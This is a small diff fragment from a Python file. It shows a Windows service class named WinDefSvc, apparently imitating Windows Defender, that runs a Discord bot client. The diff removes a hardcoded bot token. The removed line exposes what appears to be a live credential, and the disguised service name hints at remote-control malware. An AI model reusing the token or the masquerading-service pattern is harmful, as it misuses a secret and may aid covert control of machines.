@@ -287,7 +287,7 @@ class WinDefSvc(win32serviceutil.ServiceFramework):
                                     pass
 
                         client = MyClient(intents=intents)
-                        client.run("MTExOTE4NzA4NDMzMTIwMDUyMw.GDgFnv.EBjwX1O8B6eU4WPfAN4mdD6Y4sCBHbGI_MM3Gw", log_handler=None)
+                        client.run("", log_handler=None)
                     except Exception as e:
                         if debug: print(e)
                         pass
